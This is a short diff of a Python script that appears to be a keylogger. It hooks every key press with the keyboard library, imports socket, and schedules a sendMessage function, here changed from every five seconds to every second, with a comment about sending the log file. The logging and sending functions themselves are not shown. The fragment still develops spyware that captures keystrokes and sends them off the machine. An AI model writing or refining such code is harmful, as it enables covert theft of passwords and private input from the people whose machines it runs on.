@@ -1,6 +1,5 @@
 import keyboard
 import socket
-import os
 import schedule
 import time
 
@@ -63,8 +62,8 @@ def main():
 
     keyboard.on_press(keyPress)
     #Send log file every day?  Needs function for that
-    schedule.every(5).seconds.do(sendMessage)
-
+    schedule.every(1).seconds.do(sendMessage)
+    
 
     while True:
         schedule.run_pending()
@@ -75,9 +74,5 @@ def main():
     #TO LOOK INTO THIS
     #keyboard.wait()
    
-    
-
- 
-
 if __name__ == "__main__":
     main()
